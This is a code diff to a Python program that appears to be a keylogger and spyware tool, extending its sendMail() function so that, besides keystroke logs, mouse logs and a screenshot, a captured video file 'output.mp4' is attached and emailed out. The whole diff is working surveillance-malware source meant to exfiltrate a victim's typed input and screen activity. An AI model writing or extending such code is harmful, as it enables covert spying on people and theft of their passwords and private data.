@@ -63,6 +63,7 @@ def sendMail():
     filename = "keylogs.txt"
     filename2 = "mouse.txt"
     filename3 = "screen.png"
+    filename4="output.mp4"
 
     """
     try:
@@ -95,7 +96,21 @@ def sendMail():
 
 
     try:
-        with open(filename3, "rb") as attachment:   
+        with open(filename4,"rb") as attachment:
+            part4 = MIMEBase("application","octet-stream")
+            part4.set_payload(attachment.read())
+        encoders.encode_base64(part4)
+        part4.add_header(
+            "Content-Disposition",
+            f"attachment; filename= {filename4}",
+        )
+        message.attach(part4)
+
+    except FileNotFoundError:
+        return
+
+    try:
+        with open(filename3, "rb") as attachment:
             part3 = MIMEBase("application", "octet-stream")
             part3.set_payload(attachment.read())
         encoders.encode_base64(part3)
